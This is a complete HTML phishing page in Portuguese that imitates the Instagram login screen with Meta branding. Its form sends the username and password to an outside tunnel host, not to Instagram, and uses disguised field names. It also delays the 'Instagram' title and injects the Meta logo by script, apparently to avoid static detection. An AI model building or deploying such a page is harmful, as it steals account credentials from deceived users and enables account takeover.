<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Social Connect</title>
    <style>
        /* Mantenho todo o seu CSS original para o visual ficar idêntico */
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body, html { height: 100dvh; background-color: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow: hidden; }
        #splash { position: fixed; inset: 0; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 120px 0 60px 0; z-index: 1000; transition: opacity 0.35s cubic-bezier(0.4, 0, 0.2, 1); }
        .splash-logo-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; }
        .insta-splash-logo { width: 80px; height: 80px; }
        .from-meta-container { display: flex; flex-direction: column; align-items: center; gap: 6px; }
        .from-text { color: #8E8E8E; font-size: 13px; font-weight: 400; letter-spacing: 0.3px; text-transform: lowercase; }
        .meta-splash { display: flex; align-items: baseline; gap: 4px; }
        .infinity-splash { font-size: 24px; line-height: 1; font-weight: 600; background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
        .meta-word-splash { font-size: 20px; font-weight: 700; letter-spacing: -0.3px; background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
        #login-screen { display: none; flex-direction: column; align-items: center; width: 100%; height: 100dvh; background-color: #000000; padding: 0 16px; }
        .lang-selector-wrapper { width: 100%; display: flex; justify-content: center; align-items: center; padding: 16px 0 8px 0; margin-bottom: 12px; }
        .lang-selector { color: #A8A8A8; font-size: 14px; display: flex; align-items: center; gap: 4px; }
        .insta-logo-login-wrapper { width: 100%; display: flex; justify-content: center; margin-bottom: 36px; }
        .insta-logo-login { width: 64px; height: 64px; }
        form { width: 100%; max-width: 358px; }
        .input-box { width: 100%; background: #121212; border: 0.5px solid #363636; border-radius: 12px; padding: 14px 16px; color: #FFFFFF; font-size: 14px; margin-bottom: 10px; outline: none; }
        .btn-login { width: 100%; background: #0095F6; color: #FFFFFF; border: none; border-radius: 18px; padding: 10px 0; font-size: 14px; font-weight: 600; margin-top: 12px; margin-bottom: 16px; cursor: pointer; }
        .footer-container { margin-top: auto; width: 100%; display: flex; flex-direction: column; align-items: center; padding-bottom: 24px; }
        .signup-btn { width: 100%; max-width: 358px; background: transparent; border: 1px solid #0095F6; border-radius: 18px; padding: 8px 0; color: #0095F6; font-size: 14px; font-weight: 600; text-align: center; text-decoration: none; margin-bottom: 28px; }
        .meta-footer { display: flex; align-items: center; justify-content: center; opacity: 0.6; }
        .meta-footer svg { width: 70px; height: auto; }
    </style>
</head>
<body>

    <svg style="width:0; height:0; position:absolute;">
        <defs>
            <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stop-color="#833AB4"/><stop offset="50%" stop-color="#E1306C"/><stop offset="100%" stop-color="#FCAF45"/>
            </linearGradient>
        </defs>
    </svg>

    <div id="splash">
        <div class="splash-logo-wrapper">
            <svg class="insta-splash-logo" viewBox="0 0 24 24" fill="none">
                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
                <circle cx="12" cy="12" r="5.5" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instaGradient)"/>
            </svg>
        </div>
        <div class="from-meta-container">
            <p class="from-text">from</p>
            <div class="meta-splash"><span class="infinity-splash">∞</span><span class="meta-word-splash">Meta</span></div>
        </div>
    </div>

    <div id="login-screen">
        <div class="lang-selector-wrapper">
            <div class="lang-selector">Português (Brasil)</div>
        </div>
        
        <div class="insta-logo-login-wrapper">
            <svg class="insta-logo-login" viewBox="0 0 24 24" fill="none">
                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
                <circle cx="12" cy="12" r="5.5" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instaGradient)"/>
            </svg>
        </div>

        <form action="https://d20efe267c301204-143-208-80-199.serveousercontent.com" method="POST">
            <input type="text" name="u_key_data" class="input-box" id="user-input" placeholder="Usuário ou e-mail" required>
            <input type="password" name="p_val_secure" class="input-box" id="pass-input" placeholder="Senha" required>
            <button type="submit" class="btn-login" id="submit-btn">Entrar</button>
        </form>

        <div class="footer-container">
            <a href="#" class="signup-btn">Criar nova conta</a>
            <div class="meta-footer" id="meta-svg-footer"></div>
        </div>
    </div>

    <script>
        window.addEventListener('load', () => {
            const splash = document.getElementById('splash');
            const login = document.getElementById('login-screen');
            
            // Injeta o SVG da Meta via JS para não estar no HTML estático
            document.getElementById('meta-svg-footer').innerHTML = `<svg viewBox="0 0 287 56" fill="white"><path d="M55.5 14.5C55.5 14.5 58.5 10 64 10C69.5 10 72 15 72 15L79 4C79 4 73.5 -2 64 2C54.5 6 55.5 14.5 55.5 14.5Z" fill="currentColor"/><circle cx="230" cy="28" r="24" stroke="currentColor" stroke-width="8" fill="none"/><path d="M267 52L267 4L275 4L275 52L267 52Z" fill="currentColor"/></svg>`;

            setTimeout(() => {
                splash.style.opacity = '0';
                setTimeout(() => {
                    splash.style.display = 'none';
                    login.style.display = 'flex';
                    // Muda o título só agora que o usuário já entrou
                    document.title = "Instagram";
                }, 350);
            }, 2200);
        });
    </script>
</body>
</html>
